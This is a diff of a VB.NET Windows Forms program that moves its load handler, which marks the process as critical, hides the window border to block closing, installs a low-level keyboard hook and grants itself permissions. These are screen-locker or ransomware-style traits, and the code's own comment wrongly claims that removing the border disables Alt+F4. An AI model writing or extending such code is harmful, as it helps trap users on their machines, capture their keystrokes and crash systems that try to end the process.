@@ -27,9 +27,32 @@ Public Class Form1
     ' Correct declaration
     Public fullScreenOverlay As Form2
 
-    ' Constructor
-    Public Sub New()
-        InitializeComponent()
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Try
+            InitializeComponent()
+            Dim cp As New CriticalProcess()
+            Try
+                cp.SetProcessCritical()
+            Catch ex As Exception
+                Console.WriteLine("Error setting process to critical: " & ex.Message)
+            End Try
+            ' Disable Alt + F4 (window close button)
+            FormBorderStyle = FormBorderStyle.None
+            StartPosition = FormStartPosition.CenterScreen
+
+            ' Set up the low-level keyboard hook
+            hookCallbackDelegate = New HookProc(AddressOf HookCallback)
+            hookID = SetHook(hookCallbackDelegate)
+
+            Try
+                GrantSelfPermissions()
+            Catch ex As Exception
+                Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
+            End Try
+
+        Catch ex As Exception
+            MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End Try
     End Sub
 
     ' Windows API declarations
@@ -930,32 +953,4 @@ Public Class Form1
         ' Forceful exit
         Environment.Exit(0)
     End Sub
-
-    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        Try
-            Dim cp As New CriticalProcess()
-            Try
-                cp.SetProcessCritical()
-            Catch ex As Exception
-                Console.WriteLine("Error setting process to critical: " & ex.Message)
-            End Try
-            ' Disable Alt + F4 (window close button)
-            FormBorderStyle = FormBorderStyle.None
-            StartPosition = FormStartPosition.CenterScreen
-
-            ' Set up the low-level keyboard hook
-            hookCallbackDelegate = New HookProc(AddressOf HookCallback)
-            hookID = SetHook(hookCallbackDelegate)
-
-            Try
-                GrantSelfPermissions()
-            Catch ex As Exception
-                Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
-            End Try
-
-        Catch ex As Exception
-            MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-        End Try
-    End Sub
-
 End Class
